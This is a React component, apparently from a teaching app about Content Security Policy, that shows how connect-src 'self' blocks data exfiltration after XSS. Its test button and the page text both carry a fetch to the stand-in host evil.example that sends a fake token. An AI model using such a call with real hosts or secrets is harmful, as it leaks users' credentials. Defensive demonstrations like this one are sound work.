import type { CspCasePageProps } from '../types'
import { getErrorMessage } from '../utils'

function FetchLeakPage({ addLog }: CspCasePageProps): React.JSX.Element {
  const runAttack = async (): Promise<void> => {
    try {
      await fetch('https://evil.example/steal?token=fake-demo-token')
      addLog('[DANGER] Fetch ra domain la thanh cong.')
    } catch (err: unknown) {
      addLog(`[OK] Fetch ra domain la bi chan/that bai: ${getErrorMessage(err)}`)
    }
  }

  return (
    <article className="csp-case-page">
      <h3>Fetch data exfiltration</h3>
      <p>
        Neu XSS chay duoc, attacker thuong co gang gui du lieu ra server rieng. Directive
        <code> connect-src 'self'</code> chan fetch/WebSocket/EventSource ra domain la.
      </p>
      <pre>{`fetch('https://evil.example/steal?token=fake-demo-token')`}</pre>
      <button type="button" onClick={runAttack}>
        Run fetch leak test
      </button>
    </article>
  )
}

export default FetchLeakPage
